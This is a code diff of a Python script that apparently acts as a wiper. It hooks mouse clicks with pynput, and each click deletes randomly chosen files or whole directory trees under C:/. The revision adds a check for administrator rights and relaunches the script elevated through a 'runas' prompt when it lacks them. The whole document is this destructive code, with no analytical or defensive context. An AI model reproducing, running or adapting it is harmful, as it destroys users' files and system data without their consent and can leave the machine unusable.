@@ -1,42 +1,48 @@
-import os, glob, random, pynput
+import os, glob, random, pynput, ctypes, sys, shutil
 
 
-def on_click(x, y, button, pressed):
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+if is_admin(): 
     
-    if pressed:
+    def on_click(x, y, button, pressed):
         
-        path = glob.glob("C:/*")
-        
-        while True:
-            rd = random.randint(0, 10)
-            if rd  != 0:
-                try:
+        if pressed:
+            
+            pctodel = 0
+            path = "C:"
+            
+            while True:
+                
+                path = random.choice(glob.glob(f"{path}/*"))
+                
+                if os.path.isdir(path):
                     
-                    if path == []:
-                        path = glob.glob("C:/*")
+                    if len(path) == 0:
+                        pctodel = 0
+                        path = random.choice(glob.glob("C:/*"))
                         continue
                     
-                    path = glob.glob(f"{random.choice(path)}/*")
+                    rdprcnt = random.random()
+                    if rdprcnt < pctodel: 
+                        shutil.rmtree(path.replace("\\", "/"))
+                        break
                     
-                except: 
-                    for file in path:
-                        path = path.replace("/", "\\")
-                        os.system(f"del {file}")
-                        print(f"Supprimer {file}")
-                    break
-                
-            else:
-                try:
-                    path = path.replace("/", "\\")
-                    file = random.choice(path)
-                    os.system(f"del {file}")
-                    print(f"Supprimer le fichier : {file}")
-                    break
-                except:
-                    path = glob.glob("C:/*")
-                    continue
+                    pctodel += 0.1
+                    
+                else:
+                    os.remove(path.replace("\\", "/"))
+                    break         
+
+
+    with pynput.mouse.Listener(on_click=on_click) as listener:
+        listener.join()
         
-
-
-with pynput.mouse.Listener(on_click=on_click) as listener:
-    listener.join()
+        
+else:
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
